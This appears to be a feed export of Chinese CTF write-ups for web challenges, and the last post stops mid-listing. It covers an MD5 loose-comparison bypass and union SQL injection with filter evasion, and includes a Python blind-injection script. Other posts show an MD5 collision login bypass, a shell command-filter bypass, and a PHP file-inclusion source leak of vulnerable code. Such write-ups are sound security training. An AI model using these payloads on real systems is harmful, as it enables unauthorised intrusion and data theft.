<h3 id="签到题">          <a href="#签到题" class="heading-link"><i class="fas fa-link"></i></a>签到题</h3>      <p>md5弱比较</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$s = sanitize_user_input($_GET[<span class="string">'s'</span>]);</span><br><span class="line">    $h = secured_hash_function($_GET[<span class="string">'h'</span>]);</span><br><span class="line">    $r = gen_secured_random();</span><br><span class="line">    <span class="keyword">if</span>($s != <span class="keyword">false</span> &amp;&amp; $h != <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>($s.$r == $h) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Well done! Here is your flag: "</span>.$flag;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></div></figure><p>因为是将$s放在前面而且允许输入数字，那我们就可以利用MD5弱比较来进行绕过，右边生成一个0e开头的纯数字md5，左边直接输入0e与后面数字拼接即可验证通过</p>        <h3 id="SQL注入">          <a href="#SQL注入" class="heading-link"><i class="fas fa-link"></i></a>SQL注入</h3>      <p>测试列数，发现过滤，双写可以绕过</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;1&#39; oorrder by 4-- +</span><br></pre></td></tr></table></div></figure><p>测试一下过滤，发现只过滤union，select，or，然后开始正常联合注入 </p><p>数据库名ctf</p><p>爆表名<br><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; ununionion seselectlect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema&#x3D;database()-- +</span><br><span class="line"></span><br><span class="line">ctf,f1ag1nit</span><br></pre></td></tr></table></div></figure><br>爆列名</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; ununionion seselectlect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name&#x3D;&#39;f1ag1nit&#39;-- +</span><br><span class="line"></span><br><span class="line">id,flag</span><br></pre></td></tr></table></div></figure><p>爆flag时发现flag被过滤了，现在需要在不输入列名的情况下得到数据，百度搜索到一个方法</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_35078631&#x2F;article&#x2F;details&#x2F;78589926</span><br></pre></td></tr></table></div></figure><p>不过例子中的左右都是三列，使用union没有问题，而本题中f1ag1nit中只有两个字段，如果直接使用联合注入的话会因为列数不相等报错，所以我们需要给它认为加上一列，payload如下：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; uniunionon seselectlect * from (seselectlect 1)a,(seselectlect 2)b,(seselectlect 3)c ununionion seselectlect * from f1ag1nit a,(selselectect 2) b limit 1,2-- +</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3eaba49ada2ec0aa44ceaa7beee35401&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;第三次双月赛题解&quot;&gt;
          &lt;a href=&quot;#第三次双月赛题解&quot; class=&quot;heading-link&quot;&gt;&lt;i class=&quot;fas fa-link&quot;&gt;&lt;/i&gt;&lt;/a&gt;第三次双月赛题解&lt;/h1&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>HGAME2019-Web-Week3&amp;4</title>
    <link href="http://chaosec.top/2019/03/02/hgame2019b/"/>
    <id>http://chaosec.top/2019/03/02/hgame2019b/</id>
    <published>2019-03-02T07:55:12.000Z</published>
    <updated>2019-03-17T13:09:45.519Z</updated>
    
    <content type="html"><![CDATA[        <h1 id="week-3">          <a href="#week-3" class="heading-link"><i class="fas fa-link"></i></a>week-3</h1>      <a id="more"></a>        <h2 id="神奇的MD5">          <a href="#神奇的MD5" class="heading-link"><i class="fas fa-link"></i></a>神奇的MD5</h2>      <p>文件探测一下发现存在备份文件泄露<code>.login.php.swp</code>，核心代码如下<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'username'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'password'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'code'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    $code     = (string)$_POST[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == $password ) <span class="keyword">or</span> ($username == $code)  <span class="keyword">or</span> ($password == $code)) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your input can't be the same"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((md5($username) === md5($password)) <span class="keyword">and</span> (md5($password) === md5($code)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Good"</span>; </span><br><span class="line">    </span><br><span class="line">        header(<span class="string">'Location: admin.php'</span>);  </span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt; Invalid password&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></p><p>可以看到我们只要生成三个文件内容不同但是MD5值相同的文件就可以了，搜索了一下发现了一篇文章<span class="exturl"><a class="exturl__link" href="https://xz.aliyun.com/t/3161" target="_blank" rel="noopener">link</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，有一个工具fastcoll就可以生成两个MD5值相同的不同文件</p><ol><li>先生成两个MD5值相同的文件<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o test0 test1</span><br></pre></td></tr></table></div></figure></li><li>然后根据test1再生成两个MD5值相同的文件，此时test00，test01的MD5值相同<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p test1 -o test00 test01</span><br></pre></td></tr></table></div></figure></li><li>将test00的最后128位写入文件a，（-c 128 表示最后128位，tail读文件是从后往前读的，这128位正是test1和test00MD5不同的原因），同理处理一下test01<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tail -c 128 test00 &gt; a</span><br><span class="line">tail -c 128 test01 &gt; b</span><br></pre></td></tr></table></div></figure></li><li>执行type命令将test0和a的内容写进test10中，将test0和b的内容写入test11<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type test0 a &gt; test10</span><br><span class="line">type test1 b &gt; test11</span><br></pre></td></tr></table></div></figure></li></ol><p>于是就生成了test00，test01，test10，test11四个MD5值相同的文件，再用curl编码一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode username@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test00 --data-urlencode password@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test01 --data-urlencode code@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test10 http:&#x2F;&#x2F;118.25.89.91:8080&#x2F;question&#x2F;login.php -i</span><br></pre></td></tr></table></div></figure><p>之后可以得到服务器返回的cookie<code>Set-Cookie: PHPSESSID=ff92dae820810170f60ef2a04f027a61; path=/</code>，写入admin.php页面中，发现是个shell终端，可以查看到admin.php源码，关键过滤如下<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = str_replace(<span class="string">"flag"</span>,<span class="string">'none'</span>,$cmd);</span><br></pre></td></tr></table></div></figure><br>绕过很简单，通配符与单引号都可以绕过</p><p>payload：<code>cat /fl??</code> OR <code>cat /fl&#39;&#39;ag</code></p><p>flag：<code>hgame{a1c83b66cc504d583c09ea6c20c0dabc}</code></p>        <h2 id="sqli-1">          <a href="#sqli-1" class="heading-link"><i class="fas fa-link"></i></a>sqli-1</h2>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(md5($_GET[<span class="string">"code"</span>]),<span class="number">0</span>,<span class="number">4</span>) === <span class="number">7229</span></span><br></pre></td></tr></table></div></figure><p>题目需要验证码，可以爆破一下</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">999999999</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(substr(md5($i), <span class="number">0</span>, <span class="number">4</span>)===<span class="string">'803a'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>然后就是常规的数字型注入了，注意每次都要更新一下code值</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;4446&amp;id&#x3D;1 order by 1--+</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;31226&amp;id&#x3D;-1 union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></div></figure><blockquote><p>f1l1l1l1g,words </p></blockquote><p>不知道为什么表名不对，猜测可能是表名有什么问题，所以用16进制编码一下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;70176&amp;id&#x3D;-1 union select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x66316c316c316c3167--+</span><br></pre></td></tr></table></div></figure><blockquote><p>f14444444g</p></blockquote><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;51097&amp;id&#x3D;-1 union select f14444444g from f1l1l1l1g--+</span><br></pre></td></tr></table></div></figure><p>flag: <code>hgame{sql1_1s_iNterest1ng}</code></p>        <h2 id="sqli-2">          <a href="#sqli-2" class="heading-link"><i class="fas fa-link"></i></a>sqli-2</h2>      <p>依然数字型注入，只不过是盲注，本来不想写代码的，哎，还是逃不过。</p><p>PS：由于没注意看题目，结果直接上来时间盲注了，但是等的真的绝望，后来才回过味来可以bool盲注，速度才上来了</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">cookies = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'lseqgohjo9eibfivnemk6sa8vd'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(_in)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(_in.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    res = requests.get(url, cookies=cookies).text</span><br><span class="line">    code = re.findall(<span class="string">r'=== (.&#123;4&#125;)&lt;br&gt;'</span>,res)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999999999999</span>):</span><br><span class="line">        <span class="keyword">if</span> code == md5(str(i)):</span><br><span class="line">            <span class="keyword">return</span> str(i)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.111.179:3001/"</span></span><br><span class="line">output = <span class="string">"hgame&#123;sqli_1s_s0_"</span></span><br><span class="line">succ = <span class="string">"sql error"</span></span><br><span class="line">name_dic = string.digits + string.ascii_lowercase + string.ascii_uppercase + <span class="string">'_&#123;&#125;'</span>  + <span class="string">','</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> name_dic:</span><br><span class="line">        code = get_code()</span><br><span class="line">        <span class="comment"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;str(i)&#125;,1)="&#123;str(j)&#125;"),0,sleep(5))--+'</span></span><br><span class="line">        <span class="comment"># F11111114G,WORDS</span></span><br><span class="line">        <span class="comment"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name="F11111114G"),&#123;str(i)&#125;,1)="&#123;str(j)&#125;"),0,sleep(5))--+'</span></span><br><span class="line">        <span class="comment"># FL4444AG</span></span><br><span class="line">        payload = <span class="string">f'?code=<span class="subst">&#123;code&#125;</span>&amp;id=1 and if((substr((select FL4444AG from F11111114G),<span class="subst">&#123;str(i)&#125;</span>,1)=binary "<span class="subst">&#123;str(j)&#125;</span>"),sleep(-5),1)--+'</span></span><br><span class="line">        res = requests.get(url+payload,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> succ <span class="keyword">in</span> res:</span><br><span class="line">            output += j</span><br><span class="line">            print(<span class="string">"output: "</span>,output)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure><p>flag如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="基础渗透">          <a href="#基础渗透" class="heading-link"><i class="fas fa-link"></i></a>基础渗透</h2>      <p>正常注册登录，发现在点击不同的功能的时候是通过action参数来实现的，比如看到有<code>action=message</code>，猜测是不是存在文件包含，访问message.php页面发现果真存在，尝试文件包含</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.231.140.29:10080&#x2F;index.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></div></figure><p>得到源码<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"template/header.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (is_null($_SESSION[<span class="string">'user_id'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location:/login.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$page = array_key_exists(<span class="string">'action'</span>, $_GET) ? $_GET[<span class="string">'action'</span>] : <span class="string">'message'</span>;</span><br><span class="line"><span class="keyword">require</span> $page .<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"template/footer.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure></p><p>functions.php<br><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set("display_errors", "on");</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span><span class="params">($sql_query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $res = $mysqli-&gt;query($sql_query);</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_token</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $token = <span class="string">''</span>;</span><br><span class="line">    $chars = str_split(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">48</span>; $i++) &#123;</span><br><span class="line">        $token = $token . $chars[random_int(<span class="number">0</span>, <span class="number">61</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'token'</span>] = $token;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;input type='hidden' value='$token' id='token'&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">res_to_json</span><span class="params">($res, $type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $json[<span class="string">'type'</span>] = $type;</span><br><span class="line">    $json[<span class="string">'status'</span>] = <span class="string">"true"</span>;</span><br><span class="line">    $json[<span class="string">"content"</span>] = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($res <span class="keyword">as</span> $message) &#123;</span><br><span class="line"></span><br><span class="line">        $array_tmp[<span class="string">'user_id'</span>] = $message[<span class="string">'user_id'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'user'</span>] = $message[<span class="string">'user'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'avatar'</span>] = get_avatar($message[<span class="string">'user_id'</span>]) != <span class="keyword">null</span> ? get_avatar($message[<span class="string">'user_id'</span>])[<span class="string">'content'</span>] : md5($message[<span class="string">'user'</span>]);</span><br><span class="line">        $array_tmp[<span class="string">'message'</span>] = $message[<span class="string">'content'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'message_id'</span>] = $message[<span class="string">'message_id'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'time'</span>] = $message[<span class="string">'date'</span>];</span><br><span class="line">        array_push($json[<span class="string">"content"</span>], $array_tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    $json[<span class="string">"content"</span>] = $json[<span class="string">"content"</span>];</span><br><span class="line">    <span class="keyword">return</span> json_encode($json);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span><span class="params">($username, $password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username's length error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (strlen($password) &lt; <span class="number">6</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"password's length error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (judge($username, $password) == <span class="number">1</span> <span class="keyword">and</span> $token === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        $password = md5($password);</span><br><span class="line">        $sql_query = <span class="string">"insert into `users`(`username`,`password`) VALUES ('$username','$password')"</span>;</span><br><span class="line">        $res = sql_query($sql_query);</span><br><span class="line">        <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'register success!'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) <span class="keyword">and</span> $token === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        $password = md5($password);</span><br><span class="line">        $sql_query = <span class="string">"select * from `users` where `username`='$username' and `password`='$password'"</span>;</span><br><span class="line">        $res = sql_query($sql_query);</span><br><span class="line">        <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">            $data = $res-&gt;fetch_array();</span><br><span class="line">            $_SESSION[<span class="string">'user_id'</span>] = $data[<span class="string">'user_id'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'user'</span>] = $data[<span class="string">'username'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'groups'</span>] = $data[<span class="string">'groups'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">            setcookie(<span class="string">'user'</span>, $_SESSION[<span class="string">'user'</span>]);</span><br><span class="line">            setcookie(<span class="string">'groups'</span>, $_SESSION[<span class="string">'groups'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> 